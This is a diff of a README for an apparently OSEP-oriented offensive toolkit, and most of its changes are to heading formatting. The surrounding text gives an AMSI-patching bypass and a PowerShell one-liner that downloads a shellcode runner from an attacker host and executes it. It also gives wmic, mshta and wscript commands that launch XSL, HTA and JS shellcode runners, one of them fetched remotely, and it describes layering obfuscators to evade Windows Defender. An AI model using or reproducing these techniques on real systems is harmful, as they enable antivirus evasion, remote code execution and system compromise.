@@ -39,12 +39,12 @@ The executable embedds a shellcode runner. You can run it without providing any 
 
 ----
 
-**[+] AMSI Bypass [+]**
+#### [+] AMSI Bypass [+]
 There are two methods to bypass AMSI:
 - Patching 
 - Unhooking
 
-#### Method 1
+##### Method 1
 Patching template is what Offensive-Security teaches in OSEP with some small changes. The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
 
 ```
@@ -56,13 +56,12 @@ $m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetF
 $buf = [Byte[]] (0x48,0x31,0xC0)  
 ```
 
-Execute AMSI Shellcode runner
-
+**Execute AMSI Shellcode runner**
 ``` 
 powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
 ``` 
 
-#### Method 2
+##### Method 2
 To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com/jfmaes/AmsiHooker) and I permfored some small changes. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
 
 **Steps**
@@ -71,22 +70,22 @@ To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com
 
 ---
 
- **[+] Executing .XSL, .JS, .HTA [+]**
+#### [+] Executing .XSL, .JS, .HTA [+]
 
 Under directory payloads/DotNetToJScript/, you find three shellcode ruuners that generated with DotNetToJScript (https://github.com/tyranid/DotNetToJScript). 
 
-Executing .XSL shellcode runner
+**Executing .XSL shellcode runner**
 ```
 wmic process list /FORMAT:evil.xsl
 wmic os get /FORMAT:"https://example.com/evil.xsl"
 ```
 
-Executing .HTA shellcode runner
+**Executing .HTA shellcode runner**
 ```
 mshta c:\users\public\shellcode_runner.hta
 ```
 
-Executing .JS shellcode runner
+**Executing .JS shellcode runner**
 ```
 wscript c:\users\public\shellcode_runner.js
 ```
@@ -95,13 +94,13 @@ More execution methods can be found:
 - https://lolbas-project.github.io/
 
 
-**[+] ConfuserX + Net-Obfuscator [+]**
+#### [+] ConfuserX + Net-Obfuscator [+]
 
 During my tests, I noticed that Windows Defender could detect payloads genereted by ConfuserEx (https://github.com/yck1509/ConfuserEx). For this reason, I combined ConfuserEx + Net-Obfuscator (https://github.com/BinaryScary/NET-Obfuscate). 
 
 First, payloads that are located under payloads/XOR/ and payloads/Caesar/ directories, feed the ConfuserEx tool and subsequently the new obfuscated binaries are imported to Net-Obfuscator. As a result, the GetType and GetMethod values are obfuscated and  dynamically created.
 
-Example 1 - Execution of 'payloads/Caesar/shellcode_runner_assembly_numa.exe' Reflectively.
+**Example 1** - Execution of 'payloads/Caesar/shellcode_runner_assembly_numa.exe' Reflectively.
 ```
 [+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ...
 
